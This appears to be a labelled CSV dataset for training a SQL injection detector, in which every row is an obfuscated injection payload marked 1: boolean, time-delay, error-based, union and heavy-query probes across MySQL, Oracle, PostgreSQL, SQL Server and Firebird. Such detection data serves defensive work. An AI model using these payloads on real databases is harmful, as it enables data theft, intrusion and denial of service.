Query,Label
"1""  )   %%an%d 4386  =  utl_%%inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %se%l%e%c%%t   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   %%fr%%o%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    %%an%d   (  ""ynde""  =  ""ynde",1
"s%%ele%%c%%t * %%f%r%om generate_series  (  3607,3607,case when   (  3607  =  4242  )   then 1 else 0 end  )   %l%%i%mi%t 1--",1
1'||  (  %%s%el%ec%t 'blvu' f%%ro%%m dual %%w%here 9813  =  9813,1
"1,  (  %se%l%ec%t   (  case when   (  1609  =  1609  )   then waitfo%%r delay '0:0:5' else 1609*  (  %se%l%ec%t 1609 %%f%%r%%o%%m master..sysdat%a%b%%a%ses  )   end   )    )   ",1
"1' %%a%%nd elt  (  4249  =  4249,7259  )   %%a%%nd 'pgvz'  =  'pgvz",1
-1304'  )   %u%nion all %%s%elect 7639#,1
s%e%l%ect   (  case when   (  3681  =  5026  )   then 3681 else 3681*  (  s%e%l%ect 3681 fr%%o%m %%inf%%ormation_schema.character_%s%%e%ts  )   end  )  #,1
"-8612""  )   %o%r 4043  =  3083 %%a%n%%d   (  ""pjzo"" %l%i%%k%%e ""pjzo",1
"-5780 %%or make_%s%e%t  (  3464  =  4518,4518  )  -- icit",1
"%s%%el%ec%t count  (  *  )   f%r%%o%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 an%d   (  'wweo'  =  'wweo",1
"1' %%i%%n boolean mode  )   %%or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
-9148  )   w%%h%er%%e 2027  =  2027 %o%r 8571  =  8571--,1
1   )    )    as somz whe%%r%e 1598  =  1598,1
" end a%nd    (    (     (  ""poee""  =  ""poee",1
-3849  )   %%o%%r 5580  =  3442--,1
"1"" a%n%d make_%s%%e%t  (  8403  =  8403,8899  )  ",1
"-5225'   )    )    as zats %w%%h%%er%%e 5629  =  5629 %u%%n%i%on all %s%el%%e%c%t 5629,5629,5629,5629,5629--",1
"-8893%'  )   %%u%nio%%n all %s%e%l%e%%ct 1254,1254--",1
"1%""  )   o%%r char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substr%%ing  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%n%%u%%l%%l  )  ,0  )  ,500000000  )  ,%%n%%u%%l%%l  )  --",1
"-5596'   )    )     )   %u%%n%i%o%%n all %s%%e%l%%e%c%t 4877,4877,4877,4877,4877,4877,4877,4877,4877,4877--",1
"-7238%' o%r make_%s%%e%%t  (  5375  =  9563,9563  )   a%nd '%'  =  '",1
"-6883""  )   as tbai w%h%e%%r%%e 8121  =  8121 un%%i%%on all %s%el%%ec%%t 8121,8121,8121,8121,8121,8121,8121,8121--",1
"1 %%w%%h%%e%r%%e 6408  =  6408 u%%n%%i%on all se%%le%c%t n%ul%l,n%ul%l,n%ul%l,n%ul%l,n%ul%l,n%ul%l,n%ul%l,n%ul%l--",1
"call regexp_substr%%ing  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n%ull  )  ,0  )  ,500000000  )  ,n%ull  )  #",1
"1%'   )    )     )   %%or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substr%i%%ng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,%%nul%%l  )  --",1
"1""  )   w%%h%%er%e 4964  =  4964",1
1 a%n%%d 6969  =    (  se%l%ec%t 6969 f%%rom pg_sleep  (  5   )    )   -- yczq,1
"1%' o%r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substr%%ing  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,%%n%%ul%%l  )   %%and '%'  =  '",1
"1'   )    )    %or 7552  =    (  %%se%%le%c%%t count  (  *  )   fr%om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   %and    (    (   'cdaq' lik%e 'cdaq",1
"1  )   %u%n%%i%%o%n all s%%e%l%e%%c%%t %nu%%l%l,%nu%%l%l,%nu%%l%l,%nu%%l%l,%nu%%l%l#",1
1'   )    )    as jzoh w%h%%er%%e 6484  =  6484 %%a%%nd 7364  =  4233--,1
"1  )   %%w%he%%r%e 2781  =  2781 o%%r 5286  =    (  s%%e%lect count  (  *  )   f%%r%%o%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"-9764' %w%%h%%e%r%%e 1266  =  1266 %%o%r elt  (  4069  =  6162,6162  )  --",1
1 %%a%n%%d 3715 i%n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %%s%%e%l%e%c%%t   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- knpw,1
1%' r%l%%ike   (  %%sel%%e%%c%%t * f%%r%%om   (  %%sel%%e%%c%%t  (  sleep  (  5   )    )     )  vwyq  )  #,1
1 %w%he%%r%%e 3802  =  3802 %a%n%d 2006  =  2006,1
"-4355""   )    )     )   %%or 9323  =  9323#",1
"1""   )    )    as ihfw wh%er%%e 3949  =  3949 %a%nd 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
1   )    )    as tr%in %wh%%er%e 8843  =  8843,1
1'||  (  %%se%%le%%c%t 'xdzp' %fr%o%m dual w%he%%r%e 5786  =  5786 %a%%n%%d   (  3020  =  3020  )  *6703  )  ||',1
-3881   )    )     )   %%u%nio%%n all se%l%ec%t 4438--,1
%s%e%%lec%%t sleep  (  5  )   a%%n%d    (    (     (  '%'  =  ',1
1'+  (  %se%lec%t 'dkxk' %w%h%%er%%e 1241  =  1241 waitfo%r delay '0:0:5'--,1
"1""  )   a%%n%%d elt  (  6651  =  1172,1172  )   a%%n%%d   (  ""zfkb"" li%k%e ""zfkb",1
"1""  )   %%a%%nd 6565  =  2647 %%a%%nd   (  ""mrge"" %l%ik%e ""mrge",1
"1'+  (  s%%e%%le%%ct dgnt w%%h%%e%%re 4701  =  4701 %o%%r 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
-8729'+  (  %%se%le%%c%%t 'nbzl' wh%%e%r%e 7160  =  7160 %%o%%r%%d%%e%%r b%y 1#,1
"1%'  )   or row  (  1045,7562  )  >  (  sel%e%%c%%t count  (  *  )  ,concat  (  0x7171706a71,  (  sel%e%%c%%t   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  r%%a%n%%d  (  0  )  *2   )    )   x %f%%rom   (  sel%e%%c%%t 8488 un%%i%on sel%e%%c%%t 5584 un%%i%on sel%e%%c%%t 3051 un%%i%on sel%e%%c%%t 1210  )  a group %%b%y x  )   %%a%n%%d   (  '%'  =  '",1
"1   )    )    as ynzg %%w%he%%r%%e 1926  =  1926 o%r   (  %%s%%el%%e%%ct 9173 %%fr%om  (  %%s%%el%%e%%ct count  (  *  )  ,concat  (  0x7171706a71,  (  %%s%%el%%e%%ct   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floo%r  (  r%%a%nd  (  0  )  *2   )    )   x %%fr%om %i%%nfo%rmation_schema.character_s%%e%ts group %b%y x  )  a  )  --",1
"1   )    )     )   o%%r   (  s%e%l%%ec%%t 2*  (  if   (    (   s%e%l%%ec%%t * %fro%m   (  s%e%l%%ec%%t concat  (  0x7171706a71,  (  s%e%l%%ec%%t   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   %a%%n%d    (    (     (  7589  =  7589",1
1  )   as hhly %%w%he%%r%e 2906  =  2906,1
"1'   )    )     (  se%l%e%%ct   (  case when   (  4587  =  4587  )   then regexp_substr%%i%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%n%%ul%l  )  ,0  )  ,500000000  )  ,%n%%ul%l  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   fr%%o%m   (  v%%al%%u%%e%s  (  0   )    )     )   %%a%%nd    (    (   'pcim'  =  'pcim",1
1  )   as vqbf %w%%he%r%%e 4020  =  4020,1
"-8881%' u%%n%i%%o%n all se%%lec%%t 8420,8420,8420,8420,8420,8420,8420#",1
"1  )   %u%%n%io%%n all %%sel%e%%c%t n%u%%ll,n%u%%ll--",1
"1'||  (  selec%%t 'rqzu' %f%r%o%m dual %%w%%he%r%e 9516  =  9516 %%or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
1'   )    )    as gfzb %%w%h%e%r%e 7904  =  7904,1
"1%""   )    )     )   %%a%n%d char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substr%%ing  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,nul%l  )   %%a%n%d    (    (     (  ""%""  =  """,1
"-9779'   )    )    %o%%r make_%s%e%t  (  9354  =  9354,7185  )   %%a%%nd    (    (   'hmzj'  =  'hmzj",1
"1' %w%he%re 9156  =  9156 a%nd char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substri%%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%n%%u%%l%l  )  ,0  )  ,500000000  )  ,%%n%%u%%l%l  )  --",1
"call regexp_substr%%i%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%n%%ull  )  ,0  )  ,500000000  )  ,%n%%ull  )   %an%d 'ekhi'  =  'ekhi",1
"1%'   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
-7430'  )   as xfah %whe%r%e 1596  =  1596 %%o%%r 4144  =    (  %se%%lect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %se%%lect   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   %f%r%o%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   %f%r%o%m dual  )  --,1
-1648   )    )    as oqqy %w%he%%r%%e 3459  =  3459 %%o%%r 6872  =  6872--,1
"-7731""   )    )    %o%r make_%s%%e%%t  (  2551  =  4389,4389  )   a%n%d    (    (   ""unly"" l%%i%%k%%e ""unly",1
"-5372""  )   as wlqm %w%%h%%e%%re 2432  =  2432 u%%n%%ion all %%se%%l%%ec%t 2432,2432,2432,2432,2432,2432#",1
"-9996' or make_%s%%e%%t  (  1237  =  7111,7111  )  ",1
%%s%el%ect   (  case when   (  4690  =  4373  )   then 4690 else 1/  (  %%s%el%ect 0  )   end  )  --,1
"-6815 %%w%%h%%er%%e 7609  =  7609 %%o%r 1 group %by concat  (  0x7171706a71,  (  %se%%l%%ect   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flo%%o%r  (  r%%a%%nd  (  0  )  *2   )    )    hav%i%%ng m%i%%n  (  0  )  #",1
%s%%ele%ct   (  case when   (  7005  =  7118  )   then 1 else 7005*  (  %s%%ele%ct 7005 %fr%o%%m master..sys%d%a%%t%a%ba%%ses  )   end  )  --,1
"1   )    )    as xsyk %%w%h%%er%e 2575  =  2575 o%%r 8156  =    (  %s%e%%l%%e%%c%%t count  (  *  )   %f%%r%%om generate_series  (  1,5000000   )    )   --",1
"1  )   %whe%%r%%e 7815  =  7815 %%u%%n%i%o%%n all %s%e%%le%%c%%t %n%u%l%l,%n%u%l%l,%n%u%l%l,%n%u%l%l,%n%u%l%l,%n%u%l%l,%n%u%l%l#",1
s%e%l%%e%c%%t sleep  (  5  )   %an%d 'eskp' %%l%i%ke 'eskp,1
"1""  )   as advz w%h%%e%r%e 5166  =  5166 %%or 8156  =    (  %%s%%e%%l%%e%%ct count  (  *  )   f%%r%%o%m generate_series  (  1,5000000   )    )   --",1
"1""   )    )     )   a%n%d 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%s%%el%e%%ct   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   %%f%r%%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   a%n%d    (    (     (  ""fogb"" %%l%%ik%e ""fogb",1
"1""  )   as vpna %%w%h%%e%%r%%e 5450  =  5450 %%or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substri%%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%n%%u%%l%%l  )  ,0  )  ,500000000  )  ,%%n%%u%%l%%l  )  --",1
1' r%like sleep  (  5  )   a%nd 'gtfo'  =  'gtfo,1
-8966%' or   (  7475  =  4014  )  *4014 an%d '%'  =  ',1
1  )   as sdnd %whe%%r%e 9472  =  9472,1
1   )    )     )   a%n%d 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%%el%e%ct   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   %fr%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   a%n%d    (    (     (  5368  =  5368,1
"1%"" r%l%%i%%k%e sleep  (  5  )   %%a%%n%d ""%""  =  """,1
"-9944""   )    )    o%r 8537  =  2039 %%an%d    (    (   ""kfzj""  =  ""kfzj",1
"1%""  )   a%%nd 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"-3347'+  (  %%s%%ele%%c%t xuzs %w%her%e 1076  =  1076 %%u%%ni%%o%n all %%s%%ele%%c%t 1076,1076,1076,1076,1076--",1
"1'   )    )     )   %a%nd exp  (  ~  (  s%e%l%ec%t * %%fr%%o%%m   (  s%e%l%ec%t concat  (  0x7171706a71,  (  s%e%l%ec%t   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    %a%nd    (    (     (  'lyem' %l%i%k%%e 'lyem",1
"-7764"" o%%r 7308  =  7805",1
"1%'   )    )    %un%%io%%n all %%s%%e%le%%c%t %%nu%%l%l,%%nu%%l%l,%%nu%%l%l,%%nu%%l%l,%%nu%%l%l,%%nu%%l%l,%%nu%%l%l,%%nu%%l%l,%%nu%%l%l,%%nu%%l%l--",1
1' i%%n boolean mode  )   a%n%%d sleep  (  5  )  #,1
"-4152""  )   w%h%e%re 9781  =  9781 %u%%n%%i%%on all s%e%le%%ct 9781,9781,9781,9781,9781--",1
"1"" a%n%%d   (  s%ele%c%t 2*  (  if   (    (   s%ele%c%t * %%from   (  s%ele%c%t concat  (  0x7171706a71,  (  s%ele%c%t   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
"1%""  )   %o%r 1022  =    (  s%%e%l%e%c%t count  (  *  )   f%%r%om all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"-6122""  )   u%%n%%i%%o%%n all s%%el%%e%%c%%t 6578,6578--",1
sel%%ect   (  case when   (  5768  =  9169  )   then 5768 else 1/  (  sel%%ect 0  )   end  )  --,1
"1' %%w%h%%e%%r%%e 9003  =  9003 a%n%d make_%%s%%e%%t  (  5868  =  8316,8316  )  --",1
"1""   )    )     )   %%o%%r extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  sele%ct   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    %%a%nd    (    (     (  ""dzse""  =  ""dzse",1
 (  %se%l%e%%ct   (  case when   (  8130  =  5894  )   then 8130 else 8130*  (  %se%l%e%%ct 8130 %%fr%%o%%m %inf%%o%rmation_schema.character_%s%e%ts  )   end   )    ) ,1
%s%e%le%%c%%t case when 4537  =  8418 then 1 else n%%u%l%%l end--,1
1 %%or 6793  =    (  %%s%e%l%e%%c%t 6793 %f%r%om pg_sleep  (  5   )    )   -- fyaq,1
"1 %an%d   (  %s%%e%l%%e%%c%t 9067 %%f%r%om  (  %s%%e%l%%e%%c%t count  (  *  )  ,concat  (  0x7171706a71,  (  %s%%e%l%%e%%c%t   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flo%o%%r  (  r%an%d  (  0  )  *2   )    )   x %%f%r%om %i%nf%o%%rmation_schema.character_s%ets group %%by x  )  a  )  -- jpqa",1
"1""  )   w%%he%%re 5298  =  5298 %an%%d 4386  =  utl_i%naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sel%%ec%%t   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   %%f%ro%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1
"-4966%"" u%ni%%on all s%e%%lec%t 4300,4300,4300,4300,4300,4300,4300,4300#",1
"1'  )   o%r 8384  =  %li%k%%e  (  'abcdefg',upper  (  hex  (  ran%domblob  (  500000000/2   )    )      )    )    an%d   (  'lqql'  =  'lqql",1
"iif  (  3447  =  1084,1,1/0  )  ",1
"1'   )    )     )   %a%%n%d u%pda%%t%%exml  (  3393,concat  (  0x2e,0x7171706a71,  (  s%el%ec%%t   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   %a%%n%d    (    (     (  'vfnl'  =  'vfnl",1
"1'  )   %an%%d 8407  =    (  %sele%%c%t count  (  *  )   f%ro%m generate_series  (  1,5000000   )    )    %an%%d   (  'pgyl'  =  'pgyl",1
1'||  (  s%%e%l%%ect 'uedk' whe%%re 4655  =  4655,1
"1%"" %%o%%r 5356  =    (  s%%e%le%%ct count  (  *  )   %f%%ro%%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1' %%o%r char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substr%i%ng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,%%n%%ull  )  --",1
%s%elec%%t   (  case when   (  1291  =  6612  )   then 1 else 1291*  (  %s%elec%%t 1291 %f%rom master..sys%d%%a%t%%abas%%es  )   end  )  --,1
-2429%' or 6890  =  5846,1
"1%""   )    )     )   %%o%%r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    %an%%d    (    (     (  ""%""  =  """,1
-4761 %%or%der %%b%y 1--,1
1' %o%r   (  se%%l%%e%%c%t * %%f%%r%om   (  se%%l%%e%%c%t  (  sleep  (  5   )    )     )  sddo  )  #,1
"-4394'   )    )    %u%n%%i%%o%%n all s%%el%%e%%c%t 3409,3409--",1
-2960' %or 2163  =  3143--,1
1'  )   %wh%e%%re 1645  =  1645 rli%%k%%e sleep  (  5  )  --,1
"-6890""   )    )     )   %%un%%i%o%%n all s%%ele%c%t 1115#",1
1  )   %w%%he%%r%e 4479  =  4479 r%%li%%k%%e   (  s%%el%%e%ct   (  case when   (  6351  =  4367  )   then 1 else 0x28 end   )    )   --,1
"%%s%%ele%%ct * %f%r%%om generate_series  (  2317,2317,case when   (  2317  =  9706  )   then 1 else 0 end  )   %l%%i%%m%i%%t 1--",1
"se%l%%e%%c%t * %f%%ro%%m generate_series  (  3427,3427,case when   (  3427  =  7516  )   then 1 else 0 end  )   lim%%i%%t 1--",1
"1"" a%%nd elt  (  4249  =  4249,7259  )  ",1
"1'   )    )    as ewyk %w%h%e%%r%e 4828  =  4828 a%nd   (  %s%ele%%c%t 2*  (  if   (    (   %s%ele%%c%t * %f%rom   (  %s%ele%%c%t concat  (  0x7171706a71,  (  %s%ele%%c%t   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
"%s%%e%le%c%%t count  (  *  )   %f%%r%%o%%m generate_series  (  1,5000000  )   a%%n%%d ""%""  =  """,1
"-8186%' o%%r elt  (  1032  =  1032,3623  )   a%n%%d '%'  =  '",1
1   )    )    rl%%ik%%e sleep  (  5  )   a%nd    (    (   8773  =  8773,1
%%s%ele%%c%%t case when 7649  =  9297 then 1 else %%n%%u%%ll end--,1
"-2872  )   w%%h%e%%r%e 8797  =  8797 o%r 1 group b%y concat  (  0x7171706a71,  (  %se%%le%ct   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floo%r  (  r%%a%n%d  (  0  )  *2   )    )    hav%ing m%in  (  0  )  #",1
"-7255' %%u%%n%i%o%%n all s%e%%l%ec%t 2127,2127,2127,2127,2127#",1
"1'  )   w%h%%er%%e 1363  =  1363 o%%r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substr%i%ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,%n%ul%%l  )  --",1
"1%""   )    )    %o%r %u%%pd%atexml  (  1808,concat  (  0x2e,0x7171706a71,  (  s%el%%e%%ct   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   a%nd    (    (   ""%""  =  """,1
"1'||  (  %s%%e%%l%ect 'jpow' %f%%r%%o%%m dual %%w%h%%e%%r%%e 4381  =  4381 %%a%n%d   (  %s%%e%%l%ect 9067 %f%%r%%o%%m  (  %s%%e%%l%ect count  (  *  )  ,concat  (  0x7171706a71,  (  %s%%e%%l%ect   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  r%%a%n%d  (  0  )  *2   )    )   x %f%%r%%o%%m %%i%%nformation_schema.character_%se%ts group b%%y x  )  a   )    )   ||'",1
1  )   as tbve %%w%h%%er%e 4828  =  4828,1
1'+  (  s%e%%l%ec%%t iwbs w%h%e%%r%e 4939  =  4939,1
"1' in boolean mode  )   %u%%n%io%n all s%%el%%e%c%%t %%nul%%l,%%nul%%l,%%nul%%l,%%nul%%l,%%nul%%l--",1
"-4385%'   )    )    %u%%ni%%o%n all %se%l%e%%ct 6694,6694,6694,6694,6694,6694,6694,6694,6694,6694#",1
s%elec%%t   (  case when   (  7271  =  1658  )   then 7271 else 7271*  (  s%elec%%t 7271 f%%r%%o%m inf%%o%%rmation_schema.character_%%sets  )   end  )  #,1
1'  )   as fksm %wh%%er%%e 9714  =  9714,1
"1 whe%r%e 1153  =  1153 %o%r extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  %s%e%l%%ec%t   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
1  )   as drgs %wher%%e 1989  =  1989 o%%r%d%e%r %%by 1--,1
"1' a%n%%d 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1'   )    )    as kwre where 7775  =  7775 an%d 9254  =    (  s%%el%%e%%c%t count  (  *  )   %%fro%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"s%%e%l%%ec%%t count  (  *  )   %%f%%r%o%%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 %%a%n%%d    (    (     (  'qhgp'  =  'qhgp",1
"1'  )   %%o%r extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  %%s%%e%%l%e%c%%t   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    %%a%%nd   (  'blnh' %li%%k%e 'blnh",1
-1499  )   as gxfm %%w%%her%e 9762  =  9762 o%%r 5989  =  4782--,1
"1""   )    )    a%n%%d 9660  =    (  %s%ele%c%t count  (  *  )   f%%ro%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1'+  (  %s%e%%l%e%ct 'toec' %w%he%re 5810  =  5810 %a%%nd sleep  (  5   )    )   +',1
"1 or 4411  =    (  s%%ele%%c%t count  (  *  )   fr%%o%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1
-4023 o%%r   (  8779  =  5716  )  *5716,1
1'||  (  %se%l%%e%c%t 'eyiy' f%r%o%%m dual %w%h%%e%re 8127  =  8127,1
"%%s%e%%le%%c%%t count  (  *  )   f%%r%%o%%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 a%%n%%d   (  'vfxg' %%l%i%k%%e 'vfxg",1
"1',  (  beg%i%%n if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",1
"1""   )    )    as daqd %whe%re 4390  =  4390 %%an%d elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"-2009%' %u%%n%ion all se%%l%%e%%ct 1991,1991#",1
"1'   )    )    %%or elt  (  6272  =  6272,sleep  (  5   )    )    an%%d    (    (   'fele'  =  'fele",1
"1%'  )   %a%%n%%d 5556  =    (  s%%e%le%ct count  (  *  )   %%f%r%%o%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   %a%%n%%d   (  '%'  =  '",1
1  )   wh%e%re 2199  =  2199 %o%%r   (  %%s%%e%l%e%c%%t * fr%o%m   (  %%s%%e%l%e%c%%t  (  sleep  (  5   )    )     )  ydpu  )  --,1
"1' wh%%e%r%%e 4417  =  4417 %a%n%%d 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1
"-1620   )    )    %%u%%nio%%n all sel%%e%%c%t 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--",1
"1'+  (  %%s%%e%%l%%e%ct 'opqr' %w%her%e 2442  =  2442 %%o%r 1022  =    (  %%s%%e%%l%%e%ct count  (  *  )   f%%ro%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1"" %%an%d 4386  =  utl_%i%naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s%%e%%l%%ect   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   %f%r%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   ",1
"1  )   w%%h%%e%r%e 9206  =  9206 %%u%n%i%%o%n all %%s%e%l%e%c%%t %n%%ul%l,%n%%ul%l,%n%%ul%l,%n%%ul%l,%n%%ul%l,%n%%ul%l#",1
"1'+  (  %s%e%l%%e%%ct 'ycsv' w%h%%er%%e 3628  =  3628 %an%d char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substr%i%%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%n%u%%l%%l  )  ,0  )  ,500000000  )  ,%%n%u%%l%%l  )  --",1
"1%""  )   a%%nd 7533  =  7533 a%%nd   (  ""%""  =  """,1
